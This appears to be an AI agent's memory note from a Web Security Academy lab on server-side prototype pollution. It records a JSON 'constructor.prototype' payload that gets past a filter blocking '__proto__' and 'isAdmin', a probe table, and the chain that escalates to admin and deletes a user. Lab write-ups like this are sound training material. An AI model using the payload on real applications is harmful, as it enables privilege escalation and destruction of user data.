---
metadata:
  node_type: memory
name: "prs-arm-a-lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution"
description: "arm A solve: constructor.prototype bypassed the key-name filter (__proto__ and isAdmin dropped) on /my-account/change-address, flipping isAdmin via the echoed profile oracle, then /admin/delete?username=carlos"
last_updated: 2026-10-10T00:52:43+08:00
created: 2026-10-10T00:52:43+08:00
---

### Instance + auth
- Instance: `https://0a5d003c046c8cd081745295000d0060.web-security-academy.net/`, jar `/tmp/cj1.json`.
- `page_read` on the canonical academy path gave the widget lab id; `range_launch launch-url <path> --jar` launched it (reused:false, no second read needed).
- Login form posts JSON, not form-encoded: `POST /login` with form body returns 500 `Unexpected "csrf=" from [line 1, column 1]`; the correct shape is `{"csrf","username","password"}` + `Content-Type: application/json` → 302 to `/my-account?id=wiener`.
- `POST /my-account/change-address` also takes JSON and **echoes the merged user object** in its response — that echo is a direct pollution oracle, because the app always prints `isAdmin` in it.

### Filter probe (one `cache_probe` envelope, 5 rows, jar reused)
| body key | echo result |
| --- | --- |
| `"__proto__":{"isAdmin":true}` | key absent from echo, `isAdmin:false` — dropped by the filter |
| `"isAdmin":true` | echo `isAdmin:false` — the literal `isAdmin` key is blacklisted too |
| `"constructor":{"prototype":{"isAdmin":true}}` | echo `isAdmin:true` — **accepted**, pollutes `Object.prototype` |
| `"a":{"__proto__":{...}}` | `"a":{}` echoed, `isAdmin` already true from row 3 |
| `GET /admin` after the pollution | 200 admin panel |

- Doubled-substring bypass (`__pro__proto__to__`) does **not** apply to this instance: the key was merged literally into the echo, i.e. the filter strips nothing, it only drops by key name.
- Working bypass: the filter guards only the key names `__proto__` and `isAdmin`, so `constructor.prototype` merges into `Object` → `Object.prototype.isAdmin = true` server-wide.

### Solve chain
1. POST `/my-account/change-address` JSON `{"address_line_1":"x",...,"sessionId":"<sid>","constructor":{"prototype":{"isAdmin":true}}}` → echo `"isAdmin":true`.
2. `GET /admin` → 200, "Users" panel with delete links.
3. `GET /admin/delete?username=carlos` → 302 `/admin`, "User deleted successfully!".
4. `banner_verdict` → `solved:true`, `solved_class:true`, `<h4>Congratulations, you solved the lab!</h4>`.

### Lesson
When the change-address response echoes the profile object, drive the whole filter matrix through `cache_probe` (spec `{base,jar,requests:[{id,method,path,headers,body}]}`, ureq sets Content-Length itself) instead of one `http_session` call per variant: four key shapes + the `/admin` check cost one envelope and ~9 s.

